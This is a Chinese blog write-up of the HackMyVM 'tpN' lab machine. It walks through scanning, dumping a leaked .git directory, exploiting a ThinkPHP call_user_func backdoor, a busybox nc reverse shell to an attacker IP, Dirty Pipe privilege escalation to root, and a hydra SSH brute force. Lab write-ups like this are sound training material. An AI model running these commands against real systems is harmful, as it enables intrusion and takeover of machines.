@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - HackMyVM tpN</title>
+        <meta name="description" content="存活主机发现 使用 arp-scan 工具扫描局域网内存活主机。 ┌──(npc㉿kali)-[~/test] └─$ sudo arp-scan -I eth2 192.168.6.0/24 192.168.6.170 08:00:27:82:b7:e6 PCS Systemtechnik GmbH 目标主机 IP：…">
+    <link rel="canonical" href="https://the0n3.top/pages/hmv-tpn/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="HackMyVM tpN">
+    <meta property="og:description" content="存活主机发现 使用 arp-scan 工具扫描局域网内存活主机。 ┌──(npc㉿kali)-[~/test] └─$ sudo arp-scan -I eth2 192.168.6.0/24 192.168.6.170 08:00:27:82:b7:e6 PCS Systemtechnik GmbH 目标主机 IP：…">
+    <meta property="og:url" content="https://the0n3.top/pages/hmv-tpn/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/hmv-tpn/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="HackMyVM tpN">
+    <meta name="twitter:description" content="存活主机发现 使用 arp-scan 工具扫描局域网内存活主机。 ┌──(npc㉿kali)-[~/test] └─$ sudo arp-scan -I eth2 192.168.6.0/24 192.168.6.170 08:00:27:82:b7:e6 PCS Systemtechnik GmbH 目标主机 IP：…">
+        <meta name="twitter:image" content="https://the0n3.top/images/hmv-tpn/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>HackMyVM tpN</h1>
+    <p>
+        <span class="meta">发布于: 2025-12-11 14:11</span>
+    </p>
+    <div class="post-body">
+        <h2>存活主机发现</h2>
+<p>使用 arp-scan 工具扫描局域网内存活主机。</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/test]
+└─$ sudo arp-scan -I eth2 192.168.6.0/24
+
+192.168.6.170   08:00:27:82:b7:e6       PCS Systemtechnik GmbH</code></pre>
+<p>目标主机 IP：192.168.6.170。</p>
+<h2>端口扫描</h2>
+<p>nmap 扫描 TCP 全端口。</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/test]
+└─$ nmap 192.168.6.170 -p- -sT
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+8080/tcp open  http-proxy</code></pre>
+<p>开放了 22、53、8080 端口。</p>
+<h2>8080 端口 Web 服务探测</h2>
+<p>访问 8080 端口，提示一个 ThinkPHP 应用。</p>
+<p><img src="/images/hmv-tpn/1.png" alt="" decoding="async" width="1920" height="879"></p>
+<p>使用 ThinkPHP 综合利用工具扫一圈，没有发现可利用点。</p>
+<p><img src="/images/hmv-tpn/2.png" alt="" decoding="async" loading="lazy" width="982" height="739"></p>
+<h2>目录扫描</h2>
+<p>使用 dirsearch 进行目录扫描，发现靶机存在 .git 目录泄露，同时扫描到了 phpinfo 页面。</p>
+<p><img src="/images/hmv-tpn/3.png" alt="" decoding="async" loading="lazy" width="1326" height="875"></p>
+<p><img src="/images/hmv-tpn/4.png" alt="" decoding="async" loading="lazy" width="994" height="391"></p>
+<p><img src="/images/hmv-tpn/5.png" alt="" decoding="async" loading="lazy" width="1289" height="230"></p>
+<h2>利用 .git 目录下载源码</h2>
+<p>使用 git-dumper 工具下载 .git 目录源码。</p>
+<p><a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a></p>
+<p>安装。</p>
+<pre><code class="language-bash">pip install git-dumper</code></pre>
+<p>下载源码。</p>
+<pre><code class="language-bash">mkdir -p tp
+git-dumper http://192.168.6.170:8080/.git ./tp</code></pre>
+<p><img src="/images/hmv-tpn/6.png" alt="" decoding="async" loading="lazy" width="791" height="624"></p>
+<h2>代码审计</h2>
+<p>审计下载下来的源码，先看下配置方面。</p>
+<p>查看 config/app.php 文件，发现配置了多应用映射（app_map），将 think 映射到了 admin 应用。</p>
+<pre><code class="language-php">&lt;?php
+'app_map'          =&gt; ["think"=&gt;"admin"],
+'domain_bind'      =&gt; [],</code></pre>
+<p>找下框架的自定义路由，通过查找 <code>Route::</code> 关键词，发现有一个路由规则。</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/test/tp]
+└─$ grep -r 'Route::'                                     
+app/admin/route/app.php:Route::rule("sb/:a/:b","Admin/hello");  //我想给这块设置路由方便你们渗透的，不知道为什么我这个路由是无效的</code></pre>
+<p><img src="/images/hmv-tpn/7.png" alt="" decoding="async" loading="lazy" width="1650" height="861"></p>
+<p>在 app/admin/route/app.php 文件中，发现了一个没有注释的路由规则。这个路由规则映射到了 Admin 模块下的 hello 控制器。</p>
+<pre><code class="language-php">Route::rule("sb/:a/:b","Admin/hello");  //我想给这块设置路由方便你们渗透的，不知道为什么我这个路由是无效的     </code></pre>
+<p>分析 Admin 模块 hello 方法：</p>
+<p><img src="/images/hmv-tpn/8.png" alt="" decoding="async" loading="lazy" width="850" height="689"></p>
+<p>源码里导入了 app\middleware\Check1 自定义中间件，hello 方法明显是一个后门利用，接收 a、b 参数，调用 call_user_func($b, $a) 函数执行 b 参数传入的函数，并把 a 参数作为参数传入。</p>
+<pre><code class="language-php">&lt;?php
+
+namespace app\admin\controller;
+
+use app\BaseController;
+use app\middleware\Check1;
+class Admin extends BaseController
+{
+    protected $middleware =["Check1"];
+    public function hello($a,$b)
+    {
+        call_user_func($b, $a);
+    }
+
+}</code></pre>
+<p>分析 Check1 中间件，实现了一个 session 校验，会检查 session 是否有 admin 字段和 sb 字段，并且相等时才会放行。</p>
+<pre><code class="language-php">    public function handle($request, \Closure $next)
+    {
+        //
+        if ((Session::get("sb")==Session::get("token")&amp;&amp;!empty(Session::get("sb"))&amp;&amp;!empty(Session::get("token")))){
+
+            return $next($request);
+        }
+        else{
+            echo Session::get("sb");
+            echo "&lt;br&gt;";
+
+            echo Session("token");
+            return response("虽然我是新手,但是懂的一点token验证什么的");
+
+        }
+    }</code></pre>
+<p><img src="/images/hmv-tpn/9.png" alt="" decoding="async" loading="lazy" width="1469" height="820"></p>
+<p>分析哪里设置了 session 的 sb 和 token 字段，搜索 session::set 关键词，发现 app/index/controller/Token.php 文件中设置了 session。</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/test/tp]
+└─$ grep -r 'Session::set'
+app/index/controller/ViewPage1.php://            Session::set("xf","徐峰");
+app/index/controller/ViewPage1.php://            Session::set("user","徐峰");
+app/index/controller/Token.php:            Session::set("sb", $sb);</code></pre>
+<p>如果传入 post 参数 sb 为 admin，则会生成一个 token，并把 token 存入 session 的 sb 字段。</p>
+<pre><code class="language-php">┌──(npc㉿kali)-[~/test/tp]
+└─$ cat app/index/controller/Token.php 
+&lt;?php
+
+namespace app\index\controller;
+
+use app\BaseController;
+use think\facade\Session;
+
+class Token extends BaseController
+{
+    public function token()
+    {
+        $message = "请输入成员名称获取令牌";
+        if (input("post.sb") == "admin") {
+            $sb = $this-&gt;request-&gt;buildToken("token", "sha1");
+            Session::set("sb", $sb);
+            $message = "获取成功: " . $sb;
+        } elseif (input("post.sb") !== null) {
+            $message = "你是猪脑袋嘛，都明摆着了";
+
+}}}</code></pre>
+<p>那么我们可以先访问 /index/token/token 接口，传入 sb=admin，获取 token 值，拿到合法 session 后就可以利用后门了。</p>
+<p><img src="/images/hmv-tpn/11.png" alt="" decoding="async" loading="lazy" width="1493" height="830"></p>
+<p>拿到合法 session 后，访问 /admin/Admin/hello/id/passthru，执行 passthru 函数，system 在 phpinfo 里已知被 ban。</p>
+<p>尝试使用 PATH_INFO 方式访问 /think/Admin/hello/id/passthru 依然失败。</p>
+<p>回查 config/route.php 发现 default_route_pattern 被设置为 [1-9]，这限制了路由变量只能是数字。
+为了绕过这个限制，我们可以放弃 PATH_INFO 传参，改用标准的 GET 参数传递（?a=...&amp;b=...），这样就不会受到路由变量正则的约束。</p>
+<p><img src="/images/hmv-tpn/12.png" alt="" decoding="async" loading="lazy" width="1167" height="609"></p>
+<p>可以在配置里的路由规则里找到原因，默认的路由变量只使用正则匹配 <code>[1-9]</code>。
+<img src="/images/hmv-tpn/13.png" alt="" decoding="async" loading="lazy" width="1239" height="822"></p>
+<p>在 url 里直接传参 a、b，执行成功。</p>
+<p><img src="/images/hmv-tpn/14.png" alt="" decoding="async" loading="lazy" width="1250" height="550"></p>
+<h2>反弹 shell</h2>
+<p>构造反弹 shell 命令。</p>
+<pre><code class="language-bash">http://192.168.6.170:8080/think/Admin/hello?a=busybox nc 192.168.6.101 5555 -e bash&amp;b=passthru</code></pre>
+<p>稳定优化交互 shell。</p>
+<pre><code class="language-bash">/usr/bin/script  -qc /bin/bash /dev/null
+按下ctrl z
+stty raw -echo; fg  
+reset xterm  
+export TERM=xterm  
+echo $SHELL  
+export SHELL=/bin/bash  </code></pre>
+<h2>Dirty Pipe 提权</h2>
+<p>可以在用户家目录发现一份 .pwd 文件，是一个密码字典，留下来爆破 welcome 密码的大概是。</p>
+<p><img src="/images/hmv-tpn/15.png" alt="" decoding="async" loading="lazy" width="1008" height="626"></p>
+<p>拿到本地用 hydra 可以先跑着。</p>
+<p>跑了一下 linpeas，发现存在 dirtypipe 内核漏洞，可以试试。</p>
+<blockquote>
+<p>Dirty Pipe (CVE-2022-0847) 允许非特权用户覆盖任意只读文件中的数据。该 EXP 通过覆盖 SUID 程序（如 gpasswd）的内存页，注入 shellcode 来获取 root 权限。</p>
+</blockquote>
+<p><img src="/images/hmv-tpn/16.png" alt="" decoding="async" loading="lazy" width="1489" height="698"></p>
+<p>找到一篇利用文章 CVE-2022-0847。</p>
+<p><a href="https://wiki.teamssix.com/cloudnative/docker/cve-2022-0847.html">https://wiki.teamssix.com/cloudnative/docker/cve-2022-0847.html</a></p>
+<p>直接利用 linpeas 结果里给出的 exp 脚本，编译后运行提示需要一个 suid 文件，那就找一个来利用。</p>
+<pre><code class="language-bash">www-data@tpN:/tmp$ ls
+exp.c  linpeas.sh
+www-data@tpN:/tmp$ gcc exp.c -o exp
+www-data@tpN:/tmp$ ./exp 
+Usage: ./exp SUID
+www-data@tpN:/tmp$ find / -perm -4000  -type f 2&gt;/dev/null
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1</code></pre>
+<p>成功提权到 root。</p>
+<pre><code class="language-bash">www-data@tpN:/tmp$ ./exp /usr/bin/gpasswd
+[+] hijacking suid binary..
+[+] dropping suid shell..
+[+] restoring suid binary..
+[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# </code></pre>
+<p><img src="/images/hmv-tpn/17.png" alt="" decoding="async" loading="lazy" width="975" height="813"></p>
+<h2>补充</h2>
+<p>打完发现 welcome 用户密码跑出来了，密码是 eecho。</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/test]
+└─$ hydra -l welcome -P ppp -s 22 ssh://192.168.6.170 -t 5 -v -I -e nsr
+
+[22][ssh] host: 192.168.6.170   login: welcome   password: eecho</code></pre>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>hackmyvm</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#thinkphp 8</span>
+                                    <span>#dirty pipe</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
